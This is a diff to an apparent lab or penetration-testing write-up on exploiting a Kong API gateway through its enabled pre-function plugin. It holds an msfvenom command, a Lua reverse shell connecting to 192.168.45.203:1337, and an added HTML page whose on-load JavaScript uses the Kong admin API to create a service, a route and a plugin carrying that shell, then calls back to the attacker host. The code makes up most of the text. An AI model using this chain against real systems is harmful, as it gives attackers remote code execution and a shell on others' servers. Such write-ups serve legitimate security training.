@@ -709,11 +709,58 @@ Since the **`pre-function` plugin is enabled**, let's try to exploit that. The p
 ```bash
 msfvenom -p cmd/unix/reverse_lua lhost=192.168.45.203 lport=1337 -f raw -o shell.lua
 ```
-Our `shell.lua` payload
+Our `shell.lua` reverse shell payload
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cat shell.lua 
 lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.203',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~]
 └─$
+```
+Since we will be uploading a Lua file, we won't need `"lua -e"` in the final version of the payload.
+
+According to the Kong documentation, we have to add a plugin to a Service. We could add the plugin to an existing Service, but let's limit the exposure of it by creating a new Service. A Service needs a Route for us to call it. Let's create a new HTML page with a JavaScript function that creates a Service, adds a Route to the Service, then adds our Lua code as a `"pre-function"` plugin to the Service.
+
+The code is organized into three sections for clarity and easy updates. On page load, `createService()` sends a `POST` request to create a `"supersecret"` service, then calls `createRoute()` to add the `/supersecret` route. Next, `createPlugin()` adds a Lua payload as a plugin. Finally, the script sends a `GET` request to our Kali host.
+
+```html
+<html>
+<head>
+<script>
+
+function createService() {
+    fetch("http://172.16.16.2:8001/services", {
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
+    }).then(function (route) {
+      createRoute();
+    });
+}
+
+function createRoute() {
+    fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"paths": ["/supersecret"]})
+    }).then(function (plugin) {
+      createPlugin();
+    });  
+}
+
+function createPlugin() {
+    fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :["local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.203',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"]}})
+    }).then(function (callback) {
+      fetch("http://192.168.45.203/callback?setupComplete");
+    });  
+}
+</script>
+</head>
+<body onload='createService()'>
+<div></div>
+</body>
+</html>
 ```
